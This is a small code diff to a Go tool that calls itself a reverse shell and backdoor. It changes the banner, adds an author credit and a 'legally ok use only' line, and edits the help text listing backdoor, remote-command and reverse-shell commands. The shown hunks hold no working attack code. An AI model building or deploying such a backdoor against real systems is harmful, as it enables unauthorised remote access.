@@ -13,8 +13,10 @@ import (
 )
 
 func Banner() {
-	fmt.Println("  ____                   ___                   _____   _                      ____    _              _   _ \n / ___|   ___           |_ _|  _ __           |_   _| | |__     ___          / ___|  | |__     ___  | | | |\n| |  _   / _ \\   _____   | |  | '_ \\   _____    | |   | '_ \\   / _ \\  _____  \\___ \\  | '_ \\   / _ \\ | | | |\n| |_| | | (_) | |_____|  | |  | | | | |_____|   | |   | | | | |  __/ |_____|  ___) | | | | | |  __/ | | | |\n \\____|  \\___/          |___| |_| |_|           |_|   |_| |_|  \\___|         |____/  |_| |_|  \\___| |_| |_|\n")
-	fmt.Println("Go-In-The-Shell is a flexible and userfriendly reverse shell")
+	fmt.Println(",---.        |        --.--|            ,---.|         |    |    \n|  _.,---.   |,---.     |  |---.,---.   `---.|---.,---.|    |    \n|   ||   |---||   |---  |  |   ||---'---    ||   ||---'|    |    \n`---\'`---\'   ``   \'     `  `   \'`---\'   `---\'`   '`---\'`---\'`---\'")
+	fmt.Println("\nGo-In-The-Shell is a flexible and userfriendly backdoor")
+	fmt.Println("Made By Denis <cr1ng3> REMACLE\n")
+	fmt.Println("For \"legally ok\" use only")
 }
 
 func KeyGen() (rsa.PublicKey, rsa.PrivateKey) {
@@ -77,7 +79,7 @@ func InterpretCommand(command string) string {
 	fields := split(command, ' ')
 	fmt.Println(fields[0])
 	if len(fields) == 1 {
-		return "Commands you can use are : help, set_backdoor <IP:PORT>, command <UNIX_COMMAND>, get_reverseshell <IP:PORT>"
+		return "Commands you can use are : help, set_backdoor <PORT>, command <UNIX_COMMAND>, get_reverseshell <IP:PORT>"
 	} else if fields[0] == "command" {
 		return "command"
 	} else {
@@ -194,4 +196,3 @@ func main(){
 		}
 	}
 }
-
